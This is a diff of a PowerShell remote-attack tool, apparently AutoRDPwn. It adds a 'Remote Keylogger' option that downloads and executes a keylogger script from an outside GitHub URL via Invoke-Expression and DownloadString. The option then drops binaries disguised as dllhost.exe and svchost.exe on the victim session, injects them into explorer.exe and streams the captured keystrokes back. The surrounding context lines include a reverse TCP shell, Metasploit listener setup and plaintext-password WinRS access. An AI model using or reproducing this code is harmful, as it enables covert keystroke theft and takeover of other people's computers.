@@ -399,8 +399,10 @@ function Remove-Exclusions {
 	Write-host "set LPORT 4444" ; Write-host "set URIPATH $metarandom" ; Write-host "exploit"
 	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; Start-Sleep -milliseconds 2500 }
 
+        if($backdoor -like '3') { $getkeys ="true" ; Write-Host "$txt21" -ForegroundColor Green ; Start-Sleep -milliseconds 2500 }
+
 	if($backdoor -like 'X'){ $input = 'x' ; continue }
-        if($backdoor -in '1','2','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}
+        if($backdoor -in '1','2','3','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 2500 }}
 
         if($module -like '6') { Show-Banner
         Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt70" -ForegroundColor Gray
@@ -577,6 +579,17 @@ Write-Host "--------------------------------------------------------------------
 Write-Host "$using:txt52 -->` " -NoNewLine -ForegroundColor Green ; Write-Host "nc -l $using:ncport" -ForegroundColor Blue
 Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host ; Start-Sleep -milliseconds 7500
 Invoke-PowerShellTcp -Reverse -IPAddress $using:ipadress -Port $using:ncport ; del .\Invoke-PowerShellTcp.ps1 }}
+
+if ($getkeys){ Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Keylogger.ps1')
+invoke-command -session $RDP[0] -scriptblock { Set-Content -Path dllhost.exe -Value $using:Content1 -Encoding Byte ; Set-Content -Path svchost.exe -Value $using:Content2 -Encoding Byte
+.\dllhost.exe nomsg explorer.exe "$pwd\svchost.exe"
+Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
+Write-Host "                 Remote Keylogger | Press 'x' to stop                 " -ForegroundColor Blue
+Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
+do { Get-Content -wait $env:localappdata\config.dat
+if ([Console]::KeyAvailable) { $key = [Console]::ReadKey($true)
+if ($key.key -eq "x") { Write-Output "You pressed 'x' to stop" ; break }}}
+until($key.key -eq "x")}}
 
 if ($remoteforward){ invoke-command -session $RDP[0] -scriptblock { netsh interface portproxy add v4tov4 listenport=$using:rlport listenaddress=$using:rlhost connectport=$using:rrport connectaddress=$using:rrhost }}
 if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt39 <<" ; Write-Host ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
